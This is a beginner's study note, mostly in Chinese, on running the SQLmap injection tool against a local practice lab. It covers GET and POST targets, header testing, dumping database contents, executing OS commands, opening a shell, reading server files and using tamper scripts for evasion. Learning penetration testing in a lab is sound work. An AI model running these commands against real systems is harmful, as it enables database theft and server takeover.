How to use SQLmap (primary)

请求方式为get时运用

python sqlmap.py -u “带参数的URL”
For example:
python sqlmap.py -u “http://localhost/pikachu/vul/sqli/sqli_str.php?name=lili&submit=%E6%9F%A5%E8%AF%A2”

请求方式为post时运用

First：先抓包，把请求头的内容全部复制下来，在SQLMAP目录文档中建立新的文件，输入请求头内容，并且把Post请求参数输入到正文中（参数与请求头有一行空格）
python sqlmap.py -r “文件名”
Second:直接使用代码进行运用
python sqlmap.py -u “URL” --data=”参数=X”
For example: python sqlmap.py -u “URL” --data=”id=1”

SQLmap检测点：

HTTP Method –> GET、POST
Other –> HTTP Headers

当有表单的时：

python sqlmap.py -u “URL” --forms
基本上全部回车就行。若需要更改，改成 参数=x ..

对headers进行检测

按照教学视频
python sqlmap.py -u “URL” --headers=”ABC:123*”
使用*号则可以不输入参数，但暂时不懂什么意思，以后懂之后完善。

除此之外还有 –level
当输入为python sqlmap.py -u “URL” --level 5 时将进行全面检测
1时检测你输入的参数。。。

SQLmap注入语法

–risk
默认是1会测试大部分的测试语句，2会增加基于时间的检测语句，3会增加OR语句的SQL注入测试（SQLMAP会使用update语句，所以3可能会造成危害，谨慎使用）

实际获得数据库字段内容

由数据库结构可知，数据库结构数据库由数据库–数据表–数据列–字段内容构成
我们可以通过按照这个方式来一步步获取内容。
回到SQLmap，可以通过代码来获取库，表，列。
–dbs –current-db
–tables –tables -D “dbname”
–columns –columns -T “tbname” -D”dbname”
–dump-all –dump -C”columnname” -T”tbname” -D”dbname”
前一个代码可以获得全部内容，但数据量过大，可以获得当前内容再一步步推进。

演示所使用的命令

–current-user 可以获得当前的用户名
-v 可以获得注入测试的语句，后面要加参数
tips：注入点中使用真值会使得SQLMAP跑的快一点。。。
–os-cmd=”cmd命令” 执行cmd命令
–os-shell 发现shell
–file-read=”绝对路径” 读取文件，也可下载文件至本地

burpsuite日志检测和文件批量检测

-l burpsuite日志文件名 可以测试burpsuite日志格式下的地址
如何保存burpsuite_proxy日志？
菜单栏中找到Project_options,点开二级菜单栏中的misc，把Proxy的requests打钩，会弹出保存文件的地址，选择sqlmap的目录，即可保存日志，以便SQLMAP使用。
-m 批量检测，一行一个连接（GET），可以加入data来测试POST型

Tamper脚本运用

–tamper=”scriptname” 使用tamper目录下的脚本
具体使用可参考该网站:
https://blog.csdn.net/qq_34444097/article/details/82717357
